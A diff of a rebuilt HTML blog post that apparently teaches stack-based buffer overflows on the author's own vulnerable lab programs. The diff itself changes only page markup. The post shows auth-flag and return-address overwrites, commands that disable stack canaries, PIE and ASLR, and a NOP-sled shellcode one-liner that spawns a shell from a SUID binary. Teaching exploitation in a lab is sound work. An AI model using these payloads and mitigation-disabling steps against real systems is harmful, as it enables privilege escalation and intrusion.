@@ -1,9 +1,9 @@
-<!DOCTYPE html><html lang="en"> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/me.svg"><meta name="generator" content="Astro v4.15.4"><!-- Canonical URL --><link rel="canonical" href="https://danielorihuela.dev/blog/stack-based-buffer-overflows/"><!-- Primary Meta Tags --><title>Stack-based buffer overflows</title><meta name="title" content="Stack-based buffer overflows"><meta name="description" content="Learn how stack-based buffer overflows work and discover preventive measures to safeguard your code against them."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://danielorihuela.dev/blog/stack-based-buffer-overflows/"><meta property="og:title" content="Stack-based buffer overflows"><meta property="og:description" content="Learn how stack-based buffer overflows work and discover preventive measures to safeguard your code against them."><meta property="og:image" content="https://danielorihuela.dev/_astro/stack-overflow.VznqiZXX.png"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://danielorihuela.dev/blog/stack-based-buffer-overflows/"><meta property="twitter:title" content="Stack-based buffer overflows"><meta property="twitter:description" content="Learn how stack-based buffer overflows work and discover preventive measures to safeguard your code against them."><meta property="twitter:image" content="https://danielorihuela.dev/_astro/stack-overflow.VznqiZXX.png"><!-- RSS --><link rel="alternate" type="application/rss+xml" title="Daniel Orihuela" href="https://danielorihuela.dev/feed.xml"><link rel="stylesheet" href="/_astro/about.IGnllL6P.css">
-<link rel="stylesheet" href="/_astro/_slug_.DgHCkA33.css">
+<!DOCTYPE html><html lang="en"> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/me.svg"><meta name="generator" content="Astro v5.12.7"><!-- Canonical URL --><link rel="canonical" href="https://danielorihuela.dev/blog/stack-based-buffer-overflows/"><!-- Primary Meta Tags --><title>Stack-based buffer overflows</title><meta name="title" content="Stack-based buffer overflows"><meta name="description" content="Learn how stack-based buffer overflows work and discover preventive measures to safeguard your code against them."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://danielorihuela.dev/blog/stack-based-buffer-overflows/"><meta property="og:title" content="Stack-based buffer overflows"><meta property="og:description" content="Learn how stack-based buffer overflows work and discover preventive measures to safeguard your code against them."><meta property="og:image" content="https://danielorihuela.dev/_astro/stack-overflow.VznqiZXX.png"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://danielorihuela.dev/blog/stack-based-buffer-overflows/"><meta property="twitter:title" content="Stack-based buffer overflows"><meta property="twitter:description" content="Learn how stack-based buffer overflows work and discover preventive measures to safeguard your code against them."><meta property="twitter:image" content="https://danielorihuela.dev/_astro/stack-overflow.VznqiZXX.png"><!-- RSS --><link rel="alternate" type="application/rss+xml" title="Daniel Orihuela" href="https://danielorihuela.dev/feed.xml"><link rel="stylesheet" href="/_astro/about.BlhpPIz9.css">
+<link rel="stylesheet" href="/_astro/_slug_.JRAvWsf2.css">
 <style>img{margin:0 auto}div+h1{margin-top:0}h1,h2,h3,h4,h5,h6{margin-top:1em}
-</style><script type="module" src="/_astro/hoisted.DNq6m-fi.js"></script></head> <body class="bg-black bg-gradient-to-b from-black to-gray-900w-screen bg-black bg-gradient-to-b from-black to-gray-900"> <header class="px-4 py-0"> <nav class="fixed top-0 left-0 right-0 z-50 transition-all duration-500 bg-black/90 backdrop-blur-md border-b border-royalPurple/50"> <div class="max-w-7xl mx-auto px-6 lg:px-8"> <div class="flex items-center justify-between h-20">  <a href="/" class="text-2xl font-bold text-white hover:text-cyan-400 transition-colors duration-300"> <span class="text-royalPurple">&lt;</span>
+</style></head> <body class="bg-black bg-gradient-to-b from-black to-gray-900w-screen bg-black bg-gradient-to-b from-black to-gray-900"> <header class="px-4 py-0"> <nav class="fixed top-0 left-0 right-0 z-50 transition-all duration-500 bg-black/90 backdrop-blur-md border-b border-royalPurple/50"> <div class="max-w-7xl mx-auto px-6 lg:px-8"> <div class="flex items-center justify-between h-20">  <a href="/" class="text-2xl font-bold text-white hover:text-cyan-400 transition-colors duration-300"> <span class="text-royalPurple">&lt;</span>
 DO
-<span class="text-royalPurple">/&gt;</span> </a>  <div class="hidden md:flex items-center space-x-8"> <a href="/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Home <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/about/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> About <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/blog/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Blog <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/open-source/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Open Source <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a> </div>  <button id="mobile-menu-button" class="md:hidden text-white hover:text-cyan-400 transition-colors duration-300"> <svg id="menu-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" class="w-6 h-6"> <path id="menu-path" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7"></path> </svg> </button> </div>  <div id="mobile-menu" class="md:hidden transition-all duration-300 overflow-hidden max-h-0 opacity-0"> <div class="py-4 space-y-2 bg-black/95 backdrop-blur-md rounded-lg mt-2 border border-purple-900/30"> <a href="/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Home </a><a href="/about/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> About </a><a href="/blog/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Blog </a><a href="/open-source/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Open Source </a> </div> </div> </div> </nav>  </header> <article class="my-32"> <div class="w-[80ch] max-w-full m-auto text-[#d3d3d3] bg-[#222222] rounded-2xl p-8 lg:p-12 border border-gray-600/30 shadow-2xl prose prose-xl prose-invert max-w-none"> <div class="w-96 max-w-full m-auto"> <img src="/_astro/stack-overflow.VznqiZXX_ZDz1Ma.webp" class="rounded-xl shadow-ba" alt="" width="1024" height="1024" loading="lazy" decoding="async"> </div> <div class="py-4 text-center leading-none"> <div class="mb-2 text-[#ffffff]"> <time datetime="2023-10-20T00:00:00.000Z"> Oct 20, 2023 </time> </div> <h1 class="font-[Iceland]"> Stack-based buffer overflows </h1> <hr> </div>  <ul>
+<span class="text-royalPurple">/&gt;</span> </a>  <div class="hidden md:flex items-center space-x-8"> <a href="/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Home <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/about/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> About <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/blog/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Blog <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a><a href="/open-source/" class="relative px-4 duration-300 group font-[Iceland] text-gray-300 hover:text-white"> Open Source <span class="absolute bottom-0 left-0 w-full h-0.5 bg-gradient-to-r from-royalPurple to-cyan-400 transform transition-transform duration-300 scale-x-0 group-hover:scale-x-100"></span> </a> </div>  <button id="mobile-menu-button" class="md:hidden text-white hover:text-cyan-400 transition-colors duration-300"> <svg id="menu-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" class="w-6 h-6"> <path id="menu-path" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7"></path> </svg> </button> </div>  <div id="mobile-menu" class="md:hidden transition-all duration-300 overflow-hidden max-h-0 opacity-0"> <div class="py-4 space-y-2 bg-black/95 backdrop-blur-md rounded-lg mt-2 border border-purple-900/30"> <a href="/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Home </a><a href="/about/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> About </a><a href="/blog/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Blog </a><a href="/open-source/" id="menu-item" class="block px-6 py-3 text-sm font-medium transition-colors duration-300 text-gray-300 hover:text-white hover:bg-gray-800/50"> Open Source </a> </div> </div> </div> </nav> <script type="module">document.addEventListener("DOMContentLoaded",()=>{const n=document.getElementById("mobile-menu-button"),e=document.getElementById("menu-path");!n||!e||n.addEventListener("click",()=>{const t=document.getElementById("mobile-menu");t&&(t.classList.contains("max-h-0")?(t.classList.remove("max-h-0","opacity-0"),t.classList.add("max-h-96","opacity-100"),e.setAttribute("d","M6 18L18 6M6 6l12 12")):(t.classList.remove("max-h-96","opacity-100"),t.classList.add("max-h-0","opacity-0"),e.setAttribute("d","M4 6h16M4 12h16m-7 6h7")))})});</script> </header> <article class="my-32"> <div class="w-[80ch] max-w-full m-auto text-[#d3d3d3] bg-[#222222] rounded-2xl p-8 lg:p-12 border border-gray-600/30 shadow-2xl prose prose-xl prose-invert max-w-none"> <div class="w-96 max-w-full m-auto"> <img src="/_astro/stack-overflow.VznqiZXX_Z1bbFYh.webp" alt loading="lazy" decoding="async" fetchpriority="auto" width="1024" height="1024" class="rounded-xl shadow-ba"> </div> <div class="py-4 text-center leading-none"> <div class="mb-2 text-[#ffffff]"> <time datetime="2023-10-20T00:00:00.000Z"> Oct 20, 2023 </time> </div> <h1 class="font-[Iceland]"> Stack-based buffer overflows </h1> <hr> </div>  <ul>
 <li><a href="#whats-a-buffer-overflow">What’s a buffer overflow?</a></li>
 <li><a href="#whats-the-stack">What’s the stack?</a></li>
 <li><a href="#how-to-exploit-stack-based-buffer-overflows">How to exploit stack based buffer
@@ -42,7 +42,7 @@ the caller thanks to the return address. Now, on the top of the stack,
 we have the stack frame from the resumed function. The program is ready
 to go.</p>
 <p>Stack example:</p>
-<p><img  src="/_astro/stack-frame-graph.CG16iFSp_v9cnP.webp" alt="" width="359" height="216" loading="lazy" decoding="async"></p>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="359" height="216" src="/_astro/stack-frame-graph.CG16iFSp_2o6u2i.webp" ></p>
 <p>Great! We understand the basis of how the stack works at a high level.
 However, we still need to know the low-level details of that process if
 we want to exploit it. So, what’s actually happening? How does the
@@ -110,8 +110,7 @@ You can get the original source code
 <span class="line"><span style="color:#F8F8F2">  } </span><span style="color:#FF79C6">else</span><span style="color:#F8F8F2"> {</span></span>
 <span class="line"><span style="color:#50FA7B">    printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#FF79C6">\n</span><span style="color:#F1FA8C">Access Denied.</span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">);</span></span>
 <span class="line"><span style="color:#F8F8F2">  }</span></span>
-<span class="line"><span style="color:#F8F8F2">}</span></span>
-<span class="line"></span></code></pre>
+<span class="line"><span style="color:#F8F8F2">}</span></span></code></pre>
 <p>The program is simple. It receives a password. If it’s equal to
 “brillig” or “outgrabe” we will see the message “Access Granted”,
 otherwise, we will see “Access Denied”. With a buffer overflow, we can
@@ -131,10 +130,9 @@ frame is a LIFO. Hence, the <code>password_buffer</code> will be on top of the
 <p>Let’s compile the program and execute it with a bigger password than
 expected.</p>
 <pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gcc</span><span style="color:#F1FA8C"> auth_overflow.c</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> auth_overflow</span></span>
-<span class="line"><span style="color:#50FA7B">./auth_overflow</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">password</span><span style="color:#E9F284">"</span></span>
-<span class="line"></span></code></pre>
+<span class="line"><span style="color:#50FA7B">./auth_overflow</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">password</span><span style="color:#E9F284">"</span></span></code></pre>
 <p>I’ve tried with several lengths. With 25 characters, the program fails.</p>
-<p><img  src="/_astro/auth-overflow-stack-smashing.BS7gZKkC_Z13DjUp.webp" alt="" width="1182" height="244" loading="lazy" decoding="async"></p>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="1182" height="244" src="/_astro/auth-overflow-stack-smashing.BS7gZKkC_2wNytH.webp" ></p>
 <p>There’s something curious, though. The function variables only take 20
 bytes, 16 for the <code>password_buffer</code> and 4 for the <code>auth_flag</code>, but we
 need 25 bytes to make it fail. I did some research, and it seems like it
@@ -145,27 +143,25 @@ overflow attack and stoped the execution. Current versions of GCC use
 “canaries” to detect buffer overflows. It adds some data in the stack
 frame at the beginning of the function and expects that it remains
 unchanged when exiting it. Let’s disable that for our learning.</p>
-<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gcc</span><span style="color:#F1FA8C"> auth_overflow.c</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> auth_overflow</span><span style="color:#BD93F9"> -fno-stack-protector</span></span>
-<span class="line"></span></code></pre>
-<p><img  src="/_astro/auth-overflow-no-stack-protector.intDcIbx_ms7T0.webp" alt="" width="687" height="117" loading="lazy" decoding="async"></p>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gcc</span><span style="color:#F1FA8C"> auth_overflow.c</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> auth_overflow</span><span style="color:#BD93F9"> -fno-stack-protector</span></span></code></pre>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="687" height="117" src="/_astro/auth-overflow-no-stack-protector.intDcIbx_1j3JDl.webp" ></p>
 <p>With canaries disabled, let’s see how many bytes are between the
 <code>password_buffer</code> and the <code>auth_flag</code>. That will tell us the password
 length needed to overwrite the <code>auth_flag</code>. For that, we can use gdb.
 It’s only a matter of placing a breakpoint inside the vulnerable
 function and checking the memory addresses.</p>
 <pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gcc</span><span style="color:#F1FA8C"> auth_overflow.c</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> auth_overflow</span><span style="color:#BD93F9"> -fno-stack-protector</span><span style="color:#BD93F9"> -g</span><span style="color:#6272A4"> # -g option adds debug symbols</span></span>
-<span class="line"><span style="color:#50FA7B">gdb</span><span style="color:#F1FA8C"> ./auth_overflow</span></span>
-<span class="line"></span></code></pre>
-<p><img  src="/_astro/auth-overflow-gdb-variables-distance.FmqLgIFi_cdWI7.webp" alt="" width="1311" height="754" loading="lazy" decoding="async"></p>
+<span class="line"><span style="color:#50FA7B">gdb</span><span style="color:#F1FA8C"> ./auth_overflow</span></span></code></pre>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="1311" height="754" src="/_astro/auth-overflow-gdb-variables-distance.FmqLgIFi_MnKCp.webp" ></p>
 <p>There are 28 bytes between the two variables. That means that we need a
 password with 29 characters. The first 28 to fill the space between the
 variables, and the last one to overwrite the <code>auth_flag</code>. We need it to
 be different to 0. For example, “a” should overwrite the <code>auth_flag</code>
 value with its ASCII decimal value (97). We can see that in action by
 placing a couple of breakpoints. One before the <code>strcpy</code> and one after.</p>
-<p><img  src="/_astro/auth-overflow-auth-flag-new-value.DpYRttl__Z1toXRs.webp" alt="" width="1726" height="378" loading="lazy" decoding="async"></p>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="1726" height="378" src="/_astro/auth-overflow-auth-flag-new-value.DpYRttl__1v0wpp.webp" ></p>
 <p>That’s it! We got the “Access Granted” message.</p>
-<p><img  src="/_astro/auth-overflow-access-granted.COtVhOm0_ZXItMB.webp" alt="" width="677" height="285" loading="lazy" decoding="async"></p>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="677" height="285" src="/_astro/auth-overflow-access-granted.COtVhOm0_RdA06.webp" ></p>
 <h2 id="overwrite-return-address">Overwrite return address</h2>
 <p>The first example is limited, right? We can do something interesting
 only if the variable we want to overwrite is stored in the stack before
@@ -202,24 +198,22 @@ the return address.</p>
 <span class="line"><span style="color:#F8F8F2">  } </span><span style="color:#FF79C6">else</span><span style="color:#F8F8F2"> {</span></span>
 <span class="line"><span style="color:#50FA7B">    printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#FF79C6">\n</span><span style="color:#F1FA8C">Access Denied.</span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">);</span></span>
 <span class="line"><span style="color:#F8F8F2">  }</span></span>
-<span class="line"><span style="color:#F8F8F2">}</span></span>
-<span class="line"></span></code></pre>
+<span class="line"><span style="color:#F8F8F2">}</span></span></code></pre>
 <p>First, compile it without security protections and debug symbols. Here
 we added the <code>no-pie</code> option. PIE stands for Position Independent
 Executable. If enabled, the executable will be loaded in a different
 memory address every time.</p>
-<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gcc</span><span style="color:#F1FA8C"> auth_overflow2.c</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> auth_overflow2</span><span style="color:#BD93F9"> -fno-stack-protector</span><span style="color:#BD93F9"> -no-pie</span><span style="color:#BD93F9"> -g</span></span>
-<span class="line"></span></code></pre>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gcc</span><span style="color:#F1FA8C"> auth_overflow2.c</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> auth_overflow2</span><span style="color:#BD93F9"> -fno-stack-protector</span><span style="color:#BD93F9"> -no-pie</span><span style="color:#BD93F9"> -g</span></span></code></pre>
 <p>Now, where is the return address? How can we overwrite it? As in the
 first example, gdb is our friend. We can put a breakpoint inside
 <code>check_authentication</code>, run and execute <code>info frame</code>. The <code>rip</code> register
 contains the return address.</p>
-<p><img  src="/_astro/auth-overflow2-info-frame.Bqdxd_ts_2qKL6D.webp" alt="" width="1309" height="323" loading="lazy" decoding="async"></p>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="1309" height="323" src="/_astro/auth-overflow2-info-frame.Bqdxd_ts_Z2kfhnw.webp" ></p>
 <p>At this point, it’s a matter of trying several passwords until we find
 the number of bytes till the <code>rip</code> register. Same procedure as in the
 first example. Writing a password with 40 “a” and 3 “b” will overwrite
 the <code>rip</code> with the ASCII value of “bbb” (0x626262).</p>
-<p><img  src="/_astro/auth-overflow2-overwrite-rip.BbU-un7Z_eL0Kq.webp" alt="" width="1300" height="525" loading="lazy" decoding="async"></p>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="1300" height="525" src="/_astro/auth-overflow2-overwrite-rip.BbU-un7Z_ZnP713.webp" ></p>
 <p>That’s cool, but we want to overwrite the <code>rip</code> to change the code flow
 and show us the “Access Granted” message. We can disassemble the main
 function to see where the <code>print</code> functions are and get the memory
@@ -227,11 +221,11 @@ address for the first <code>print</code>. The +86 memory address points to the
 conditional before the prints. We can take the next address. If PIE was
 enabled, this wouldn’t be that easy. The address would change every time
 we run it.</p>
-<p><img  src="/_astro/auth-overflow2-access-granted-address.CkDqvnED_lYhyL.webp" alt="" width="1103" height="962" loading="lazy" decoding="async"></p>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="1103" height="962" src="/_astro/auth-overflow2-access-granted-address.CkDqvnED_ZeAVM0.webp" ></p>
 <p>Replacing “bbb” with “<code>\x</code>{=latex}7f<code>\x12</code>{=latex}<code>\x40</code>{=latex}” gives
 us the “Access Granted” message. We add the memory address in reverse
 because my machine uses Little Endian.</p>
-<p><img  src="/_astro/auth-overflow2-access-granted.ByReQBgo_28Ev2X.webp" alt="" width="1348" height="205" loading="lazy" decoding="async"></p>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="1348" height="205" src="/_astro/auth-overflow2-access-granted.ByReQBgo_2bb1vP.webp" ></p>
 <h2 id="get-shell">Get shell</h2>
 <p>The second example was a bit more interesting, but still limited. In
 this final example, we are going to see how to get access to a shell.</p>
@@ -293,13 +287,11 @@ That way, we can execute it with normal users as if it was root.</p>
 <span class="line"><span style="color:#50FA7B">  printf</span><span style="color:#F8F8F2">(</span><span style="color:#E9F284">"</span><span style="color:#F1FA8C">Note has been saved.</span><span style="color:#FF79C6">\n</span><span style="color:#E9F284">"</span><span style="color:#F8F8F2">);</span></span>
 <span class="line"><span style="color:#50FA7B">  free</span><span style="color:#F8F8F2">(buffer);</span></span>
 <span class="line"><span style="color:#50FA7B">  free</span><span style="color:#F8F8F2">(datafile);</span></span>
-<span class="line"><span style="color:#F8F8F2">}</span></span>
-<span class="line"></span></code></pre>
+<span class="line"><span style="color:#F8F8F2">}</span></span></code></pre>
 <pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gcc</span><span style="color:#F1FA8C"> notetaker.c</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> notetaker</span><span style="color:#BD93F9"> -g</span></span>
 <span class="line"><span style="color:#50FA7B">sudo</span><span style="color:#F1FA8C"> chown</span><span style="color:#F1FA8C"> root:root</span><span style="color:#F1FA8C"> notetaker</span></span>
 <span class="line"><span style="color:#50FA7B">sudo</span><span style="color:#F1FA8C"> chmod</span><span style="color:#F1FA8C"> u+s</span><span style="color:#F1FA8C"> notetaker</span></span>
-<span class="line"><span style="color:#50FA7B">./notetaker</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">example message</span><span style="color:#E9F284">"</span></span>
-<span class="line"></span></code></pre>
+<span class="line"><span style="color:#50FA7B">./notetaker</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">example message</span><span style="color:#E9F284">"</span></span></code></pre>
 <p>The second program, the vulnerable one, is used to search notes for the
 current user. Optionally, we can show only the messages that contain a
 specific string.</p>
@@ -403,17 +395,14 @@ specific string.</p>
 <span class="line"><span style="color:#FF79C6">        return</span><span style="color:#BD93F9"> 1</span><span style="color:#F8F8F2">;</span><span style="color:#6272A4">                // return matched.</span></span>
 <span class="line"><span style="color:#F8F8F2">    }</span></span>
 <span class="line"><span style="color:#FF79C6">  return</span><span style="color:#BD93F9"> 0</span><span style="color:#F8F8F2">;</span><span style="color:#6272A4"> // Return not matched.</span></span>
-<span class="line"><span style="color:#F8F8F2">}</span></span>
-<span class="line"></span></code></pre>
+<span class="line"><span style="color:#F8F8F2">}</span></span></code></pre>
 <pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">gcc</span><span style="color:#F1FA8C"> notesearch.c</span><span style="color:#BD93F9"> -o</span><span style="color:#F1FA8C"> notesearch</span><span style="color:#BD93F9"> -fno-stack-protector</span><span style="color:#BD93F9"> -no-pie</span><span style="color:#BD93F9"> -g</span></span>
 <span class="line"><span style="color:#50FA7B">sudo</span><span style="color:#F1FA8C"> chown</span><span style="color:#F1FA8C"> root:root</span><span style="color:#F1FA8C"> notesearch</span></span>
 <span class="line"><span style="color:#50FA7B">sudo</span><span style="color:#F1FA8C"> chmod</span><span style="color:#F1FA8C"> u+s</span><span style="color:#F1FA8C"> notesearch</span></span>
-<span class="line"><span style="color:#50FA7B">./notesearch</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">example</span><span style="color:#E9F284">"</span></span>
-<span class="line"></span></code></pre>
+<span class="line"><span style="color:#50FA7B">./notesearch</span><span style="color:#E9F284"> "</span><span style="color:#F1FA8C">example</span><span style="color:#E9F284">"</span></span></code></pre>
 <p>We need to disable the Adress Space Layout Randomization (ASLR) to avoid
 random memory addreses.</p>
-<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#BD93F9"> 0</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> sudo</span><span style="color:#F1FA8C"> tee</span><span style="color:#F1FA8C"> /proc/sys/kernel/randomize_va_space</span></span>
-<span class="line"></span></code></pre>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#8BE9FD">echo</span><span style="color:#BD93F9"> 0</span><span style="color:#FF79C6"> |</span><span style="color:#50FA7B"> sudo</span><span style="color:#F1FA8C"> tee</span><span style="color:#F1FA8C"> /proc/sys/kernel/randomize_va_space</span></span></code></pre>
 <p>You may be wondering if ASLR and PIE do the same. Both disable the
 randomization of memory addresses for executables. That’s true. However,
 they randomize different things. ASLR is a kernel protection feature,
@@ -462,25 +451,24 @@ address where the NOP sled is located.</p>
 I used a “NOP sled, shellcode, NOP sled address” structure. It didn’t
 work for multiple reasons. NX bit wasn’t disabled and ASLR wasn’t
 disabled.</p>
-<p><img  src="/_astro/notesearch-stack.CuTXw4O9_1HW1IE.webp" alt="" width="1026" height="554" loading="lazy" decoding="async"></p>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="1026" height="554" src="/_astro/notesearch-stack.CuTXw4O9_Z1rOPif.webp" ></p>
 <p>After disabling them, the issue was creating the correct payload.
 Sometimes, the execution failed with a SEGFAULT and sometimes with a
 SIGILL. Trying a myriad of different payload structures and lengths for
 the NOP operations, I finally crafted a payload that worked using gdb.</p>
-<p><img  src="/_astro/notesearch-gdb-exploit.B2R-iprd_Z29ouFF.webp" alt="" width="828" height="368" loading="lazy" decoding="async"></p>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="828" height="368" src="/_astro/notesearch-gdb-exploit.B2R-iprd_17arFG.webp" ></p>
 <p>This payload doesn’t work outside gdb. The environment in which we
 execute the exploit can modify the position of the variables in the
 stack. For example, the environment variables used on gdb differ from
 the ones on the shell. To circumvent that issue, we can pass the
 environment variables to gdb.</p>
-<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">env</span><span style="color:#F1FA8C"> gdb</span><span style="color:#F1FA8C"> notesearch</span></span>
-<span class="line"></span></code></pre>
+<pre class="astro-code dracula" style="background-color:#282A36;color:#F8F8F2; overflow-x: auto;" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#50FA7B">env</span><span style="color:#F1FA8C"> gdb</span><span style="color:#F1FA8C"> notesearch</span></span></code></pre>
 <p>The path from where you execute the exploit is also relevant.
 <code>./notesearch $(perl -e 'print "\x90" x 57, "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05", "\x90" x 40, "\x90\xe3\xff\xff\xff\x7f\x00\x00"')</code>
 didn’t work for me, while
 <code>~/Desktop/overflow/notesearch $(perl -e 'print "\x90" x 57, "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05", "\x90" x 40, "\x90\xe3\xff\xff\xff\x7f\x00\x00"')</code>
 worked.</p>
-<p><img  src="/_astro/notesearch-final-exploit.BdbsqXtn_VFSON.webp" alt="" width="968" height="137" loading="lazy" decoding="async"></p>
+<p><img  loading="lazy" decoding="async" fetchpriority="auto" width="968" height="137" src="/_astro/notesearch-final-exploit.BdbsqXtn_Zd266y.webp" ></p>
 <p>That’s it!!! We got our shell. In theory, we should get root access due
 to the SUID permissions. However, some shells now throw SUID permissions
 when spawning new shells from a process with SUID to avoid this kind of
